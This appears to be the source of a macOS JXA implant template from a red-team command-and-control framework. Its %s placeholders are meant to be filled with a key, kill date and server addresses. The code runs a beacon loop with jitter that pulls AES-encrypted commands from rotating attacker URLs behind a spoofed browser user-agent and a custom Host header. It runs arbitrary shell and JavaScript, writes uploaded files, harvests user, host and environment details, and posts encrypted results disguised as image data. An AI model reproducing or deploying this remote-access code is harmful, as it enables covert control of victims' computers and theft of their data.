ObjC.import('Cocoa');
ObjC.import('Foundation');
ObjC.import('stdlib');
ObjC.import('Security');
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

//Global Vars:
var key = "%s";
var parameters = $({"type": $.kSecAttrKeyTypeAES});
var raw_key = $.NSData.alloc.initWithBase64Encoding(key);
var cryptokey = $.SecKeyCreateFromData(parameters, raw_key, Ref());
var jitter = %s;
var s2 = "";

function beacon(sleepTime) {
    if (sleepTime.toLowerCase().includes('m')) {
        sleepTime = sleepTime.replace("m", "");
        newSleep = sleepTime * 60;
    }
    else if (sleepTime.toLowerCase().includes('h')) {
        sleepTime = sleepTime.replace("h", "");
        newSleep = sleepTime * 60;
        newSleep = newSleep * 60;
    }
    else if (sleepTime.toLowerCase().includes('s')) {
        sleepTime = sleepTime.replace("s", "");
        newSleep = sleepTime;
    }
    else {
        newSleep = sleepTime;
    }
    sleepTime = newSleep;
    return sleepTime;
}

var sleepTime = "5";
var newSleep = "%s";
sleepTime = beacon(newSleep);

// Implant Information (Used to show what user, hostname, IP, etc)
class agent{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = "";
		this.cu = ObjC.deepUnwrap(this.procInfo.userName);
		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses);
		this.pid = this.procInfo.processIdentifier;
		this.host = ObjC.deepUnwrap(this.hostInfo.names)[0];
		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString.js;
	}
}
var posh_implant = new agent();

function run_module(m) {
    let cmdOutput = "";
    try {
        cmdOutput = eval(s2 + "\n" + m);
    }
    catch(error) {
        cmdOutput = error.toString();
    }
    return cmdOutput;
};

function loadmodule(m){
    s2 = m;
    return "Module Loaded";
};

function readFile(file) {
    // Convert the file name to a string
    var fileString = file.toString();

    // Read the file using a specific delimiter and return the results
    return currentApp.read(Path(fileString));
}

function writeFile(file, data) {
    // Convert the data to a string
    //var fileString = file.toString()
    if (typeof data == "string") {
        data = convert_to_nsdata(data);
    }
    data.writeToFileAtomically(file, true);

    // Read the file using a specific delimiter and return the results
    return "File written";
};

function run_shell(command){
	//simply run a shell command via doShellScript and return the response
    let response = "";
    //console.log("in shell");
	try{
		//console.log("Running command: " + command);
		response = currentApp.doShellScript(command);
		if(response === undefined || response === ""){
		    response = "No Command Output";
		}
		// shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
		response = response.replace(/\r/g, "\n");
		return response;
	}
	catch(error){
		response = error.toString().replace(/\r/g, "\n");
		return response;
	}
};

function run_jxa(m){
    let jxa = decode(m);
    let cmdOutput = ObjC.deepUnwrap(eval(jxa));
    return cmdOutput;
};

// partly based on Apfel https://github.com/its-a-feature/Mythic
function enc(data){
    // takes in the string we're about to send, encrypts it, and returns a new string
    let err = Ref();
    let encrypt = $.SecEncryptTransformCreate(cryptokey,err);
    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
    //generate a random IV to use
    let IV = $.NSMutableData.dataWithLength(16);
    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
    //$.CFShow(IV);
    // set our data to be encrypted
    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
    b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
    let encryptedData = $.SecTransformExecute(encrypt, err);
    //$.CFShow(encryptedData);
    // now we need to prepend the IV to the encrypted data before we base64 encode and return it
    let length = encryptedData.length;
    let remainder = length %% 16;
    if ( remainder != 0 ) {
      for (i=0; i < (16 - remainder); i++) {
          encryptedData.push("\x00");
        }
    }
    length = encryptedData.length;
    let final_message = $.NSMutableData.dataWithLength(0);
    final_message.appendData(IV);
    final_message.appendData(encryptedData);
    //console.log(final_message.base64EncodedStringWithOptions(0).js);
    return final_message.base64EncodedStringWithOptions(0).js;
}

function dec(nsdata){
    //takes in a base64 encoded string to be decrypted and returned
    let err = Ref();
    let decrypt = $.SecDecryptTransformCreate(cryptokey, err);
    $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
    // The first 16 bytes are the IV and the rest is the message to decrypt
    let iv_range = $.NSMakeRange(0, 16);
    let message_range = $.NSMakeRange(16, nsdata.length - 16);
    let iv = nsdata.subdataWithRange(iv_range);
    $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
    let message = nsdata.subdataWithRange(message_range);
    //$.CFShow(message);
    $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
    let decryptedData = $.SecTransformExecute(decrypt, Ref());
    let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
    return decrypted_message;
}

function decode(data) {
    // base64 decoding
	if(typeof data == "string"){
			var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
	}
	else{
			var ns_data = data;
	}
	var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
	return decoded_data;
}

function encode(data) {
    //base64 encoding
	if(typeof data == "string"){
			var ns_data = convert_to_nsdata(data);
	}
	else{
			var ns_data = data;
	}
	var encstring = ns_data.base64EncodedStringWithOptions(0).js;
	return encstring;
}

convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
};


function generateURL() {
    let minNum = 0;
    let maxNum = serverURLs.length;
    let maxNumURL = urls.length;
    let num = Math.floor(Math.random() * (maxNum - minNum) ) + minNum;
    let numURL = Math.floor(Math.random() * (maxNumURL - minNum) ) + minNum;
    let randomURI = urls[numURL]; //random choice from urls
    serverClean = serverURLs[num];
    server = serverClean + "/" + randomURI + "?" + uri;
    return server;
}

function getImgData() {
    let icoImage = [%s];
    minNum = 0;
    maxNum = icoImage.length;
    //console.log(maxNum);
    num = Math.floor(Math.random() * (maxNum - minNum) ) + minNum;
    let randomICO = icoImage[num]; //random choice from icoImage
    let results = randomICO.padEnd(1500, icoImage[num]);
    results = results.substring(0, 1500);
    return results;
}

function postData(postCookie, dataImageBytes, server) {
    let postReq = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(server));
	// Setup Cookie to be the encrypted task id
    postReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String("SessionID="+postCookie), $.NSString.alloc.initWithUTF8String("Cookie"));
    // Other Headers
    postReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(""), $.NSString.alloc.initWithUTF8String("Referer"));
    //console.log("host header: " + h);
    if (h != ""){
        postReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(h), $.NSString.alloc.initWithUTF8String("Host"));
    }
    postReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(ua), $.NSString.alloc.initWithUTF8String("User-Agent"));
    postReq.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
    let postData = $(dataImageBytes).dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, false);
    let postLength = $.NSString.stringWithFormat("%%d", postData.length);
    //console.log(postData.length); //i think i broke it.
    postReq.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
    postReq.setHTTPBody(postData);
    let postResponse = Ref();
    let postError = Ref();
    let postResponseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(postReq,postResponse,postError);
}

function getData(server){
    let getReq = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(server));
    // Other Headers
    getReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(""), $.NSString.alloc.initWithUTF8String("Referer"));
    if (h != ""){
        getReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(h), $.NSString.alloc.initWithUTF8String("Host"));
    }
    getReq.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(ua), $.NSString.alloc.initWithUTF8String("User-Agent"));
    // Initial Request is a GET
    getReq.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
    let getResponse = Ref();
    let getError = Ref();
    let getResponseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(getReq,getResponse,getError);
    //$.CFShow(getResponseData); 
    return getResponseData;
}

function commander(c) {
    let id = c.substring(0,5);
    //console.log("ID: " + id);
    c = c.substring(5,);
    //console.log(c);
    try{
        if (c.substring(0,6) == "beacon") {
            console.log("Updating sleep time to: " + c.substring(7,));
            sleepTime = c.substring(7,);
            sleepTime = beacon(sleepTime);
            cmdOutput = "Sleep updated to " + c.substring(7,);
        }
        else if (c.substring(0,10) == "loadmodule") {
            let m = c.substring(10,);
            cmdOutput = loadmodule(m);
          }
        else if (c.substring(0,10) == "run-module") {
            let m = c.substring(11,); 
            cmdOutput = run_module(m);
        }
        else if (c.substring(0,7) == "run-jxa") {
            m = c.substring(8,);
            cmdOutput = run_jxa(m);
        }
        else if (c.substring(0,11) == "upload-file") {
            let upload_bytes = c.substring(12,).split(":")[1];
            let upload_destination = c.substring(12,).split(":")[0];
            let decoded = decode(upload_bytes);
            cmdOutput = writeFile(upload_destination, decoded)
        }
        else {
            cmdOutput = run_shell(c); 
        }
    }
    catch(error){
        cmdOutput = error.toString();
        //console.log(error);
    }
    let postCookie = enc(id);
    let encData = enc(cmdOutput);
    let dataImage = getImgData();
    dataImage = dataImage + encData;
    postData(postCookie, dataImage, server);
}

var ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15";
var uri= "%s";
var serverClean = %s;
var rotate = "";
while (true) {
    if (!rotate){
        var serverURLs = [serverClean,serverClean];
    } else {
        var serverURLs = rotate;
    }
    // get current date and time
    let month = ("0" + (currentApp.currentDate().getMonth() + 1)).slice(-2);
    let day = ("0" + currentApp.currentDate().getDate()).slice(-2);
    let year = currentApp.currentDate().getFullYear();
    let d = year + "-" + month + "-" + day;
    // kill date
    let k = "%s";
    if (k < d) {
        $.exit(0);
    }
    // Set range for jitter sleep then set to newSleepTime
    let max = (sleepTime * (1 + jitter));
    let min = (sleepTime * (1 - jitter));
    let newSleepTime = Math.floor(Math.random() * (max - min) ) + min;
    $.NSThread.sleepForTimeInterval(sleepTime);
    var urls = [%s]; 
    let server = generateURL();
    try {
        var readCommand = getData(server);
    } catch(error) {console.log("error");console.log(error);}
    server = generateURL();
    try {
        let p = $.NSData.alloc.initWithBase64Encoding(readCommand);
        //console.log(p);
        var ns_data = convert_to_nsdata(p);
        if(typeof p == "string"){
                var ns_data = convert_to_nsdata(p);
        }
        else{
                var ns_data = p;
        }
        let readCommandClear = dec(ns_data);
        readCommandClear = decode(readCommandClear.js);
        //console.log("From Server: " + readCommandClear);
        if (readCommandClear.includes("multicmd")) {
            let splitcmd = readCommandClear.replace("multicmd","");
            let cmdOutput = "";
            let splits = splitcmd.split("!d-3dion@LD!-d");
            splits.forEach(cmd => commander(cmd));
          }
    } catch {}
}
